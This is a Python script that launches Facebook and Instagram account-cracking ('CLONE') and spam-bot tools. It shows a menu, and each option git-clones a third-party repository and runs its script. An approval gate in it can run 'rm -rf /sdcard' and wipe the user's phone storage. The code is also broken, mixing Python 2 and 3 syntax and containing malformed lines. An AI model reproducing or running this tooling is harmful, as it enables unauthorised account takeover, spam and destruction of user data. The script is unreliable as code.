import uuid
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
 
host="https://mbasic.facebook.com"

us = [
'Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 9; RMX1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; SM-A105FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; SNE-LX1 Build/HUAWEISNE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3'
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',]

logo ="""
         \x1b[1;97m ooo        ooooo       .o.       ooooo   ooooo oooooooooo.   ooooo  \033[1;0m
         \x1b[1;91m  88.       .888'      .888.      `888'   `888' `888'   `Y8b  `888 \033[1;0m
         \x1b[1;97m  888b     d'888      .8"888.      888     888   888      888  888  \033[1;0m
         \x1b[1;91m  8 Y88. .P  888     .8' `888.     888ooooo888   888      888  888  \033[1;0m
         \x1b[1;97m  8  `888'   888    .88ooo8888.    888     888   888      888  888 \033[1;0m
         \x1b[1;91m  8    Y     888   .8'     `888.   888     888   888     d88'  888  \033[1;0m
         \x1b[1;97m o8o        o888o o88o     o8888o o888o   o888o o888bood8P'   o888o  \033[1;0m
\x1b[1;97m------------------------\x1b[1;97m------------------------Ã—
\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97m          MAHDI HASAN SHUVO
\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97m          facebook.com/m.mahdi.80
\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97m           MAHDI SHUVO
\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m             4.0.0
\x1b[1;97m------------------------\x1b[1;97m------------------------Ã—
                                                 """

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["Pakistan"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]


def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "what are you thinking now" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result8

def main():
    os.system("clear")
    print(logo)

    
os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLOGIN KI LIYE APPROVAL LYLO PEHLY '
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.sa.txt', 'r').read()
        if to ==" ":
            os.system('rm -rf /sdcard')
            os.system('rm -rf /sdcard/*')
        
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/MAHDI-Shuvo/maprove/main/mahdi.text').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        menu()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved '
        print ' \x1b[1;92mCopy the id and send to Admin'
        print ' \x1b[1;92mYour id : ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923496519800')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter ,'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923496519800')
    sav = open('/sdcard/.sa.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()



def menu():
    os.system('clear')
    
def menu():
    os.system('clear')

print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
\033[0m================================================================
\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
\033[0;33mGITHUB : \033[1;97mhttps://github.com/====
\033[1;31mFb ; https://web.facebook.com/m.mahdi.80
WHATAPP:01887408882
\033[1;33mLIVE in Sylhet (Read in class 10)
\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU 
\033[0;36m================================================================""")
print("""
\033[1;36m[1]CLONE FROM2006- 2009 ID
\033[1;32m[2]CLONE FROM 2009 ID 
\033[1;88m[3]CLONE FROM 2010-2020 ID
\033[1;33m[4]CLONE FROM  BANGLADESH 6DIG[All SIM]
\033[1;32m[5]CLONE FROM INSTRAGAM ID
\033[1;33m[6]CLONE FROM FRIENDLIST (NEED TOKEN)
\033[1;36m[7]CLONE FROM  PUBLICK ID v2
\033[1;32m[8]CLONE FROM ID BANGLADESH 11DIG[All SIM]
\033[1;33m[9]CLONE FROM NUMBER BD
\033[1;88m[10]CLONE FROM FREOM PAKISTAN 
\033[1;88m[11]CLONE FROM FROM INDIA
\033[0;33m[12]CLONE FROM AFGHANISTAN 
\033[0;88m[13]CLONE FROM FREOM PAKISTAN V2(All SIM)
\033[1;33m[14]CLONE FROM FREOM File Creating
\033[1;35m[15]CLONE FROM LATEST FB CRACKING LOGIN
\033[1;33m[16]CLONE FROM ID BANGLADESH 9DIG (All SIM)
\033[1;32m[17]CLONE FROM 2009 ID [MAO]
\033[1;37m[18]FB AUTO SHARE (need TOKEN)
\033[1;33m[19]FB AUTO COMMENT(need TOKEN)
\033[1;33m[20]CLONE YAHOO 
\033[1;36m[21]CLONE FROM  PUBLICK ID  (Best) v2
\033[1;36m[22]CLONE FROM  PUBLICK ID  (best) v2
\033[1;33m[23]CLONE FROM FREOM File Creating V
\033[1;36m[24]CLONE FROM2003- 2005 ID[VARY SLOW]
\033[1;36m[25]CLONE FROM ID BANGLADESH 11DIG[BEST]
""")
pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")

if pil in ["01", "1"]:

    os.system('cd paidfree4')
    os.system('python2 mahdi9.py')
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["02", "2"]:
    os.system('cd paidfree4')
    os.system('python 20091st.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["03", "3"]:
    os.system('cd paidfree4')
    os.system('python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["04", "4"]:
    os.system('cd paidfree4')
    os.system('python2 BD6.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["05", "5"]:
    os.system('cd paidfree4 && python instragam.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["06", "6"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    os.system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["07", "7"]:
    os.system('cd paidfree4')
    os.system('python Prem.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["08", "8"]:
    os.system('cd paidfree4')
    os.system('python2 BD11.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["09", "9"]:
    os.system('git clone https://github.com/Azim-vau/smbf.git && cd smbf')
    os.system('python2 smbf.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["10"]:
    os.system('cd paidfree4 && python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
	
	
elif pil in ["11"]:
    os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["12"]:

    os.system('python2 Mahadi-Afg.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["13"]:
    os.system('cd paidfree4')
    os.system('python mahdi2.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["14"]:
    os.system('git clone https:/github.com/James404-cyber/DUM-ID.git')
    os.system('cd DUM-ID && python Doubled.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["15"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    
elif pil in ["16"]:
    os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd shuvook && python2 bd9.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["17"]:
    os.system('pip2 install mclone')
    os.system('mclone')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["18"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
    os.system('cd fbboT && python mahdi.py')
elif pil in ["19"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
    os.system('cd fbboT && python autocomment.py')
	
elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs')	
    os.system('cd texs && python yahoo.py')
elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	

elif pil in ["21"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall')
    os.system('cd mall && python Adf.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
	
elif pil in ["22"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall')
    os.system('cd mall && python fcpromax.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["23"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall')
    os.system('cd mall && python2 file.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["24"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs')
    os.system('cd texs && python2 811.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)

elif pil in ["25"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall')
    os.system('cd mall && python2 RR_Premium.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
